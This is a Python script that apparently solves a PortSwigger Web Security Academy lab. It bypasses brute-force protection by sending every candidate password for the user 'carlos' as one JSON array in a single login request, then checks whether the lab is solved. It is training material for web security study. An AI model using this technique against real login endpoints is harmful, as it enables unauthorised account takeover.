from listgen import *
import requests
import argparse
import json

parser = argparse.ArgumentParser(description='Solves the following Lab: Broken brute-force protection, multiple credentials per request')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")
headers = {"Content-Type": "application/json","Cookie":f"session={session}"}
data = {"username":"carlos","password":[]}

# MERGE ALL POSSIBLE PASSWORDS IN A SINGLE LIST OF VALUES
for password in passlist():
    data["password"].append(password)
json_data = json.dumps(data)

# LOGIN
requests.post("https://" + lab.id + f".web-security-academy.net/login", headers=headers, data=json_data)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")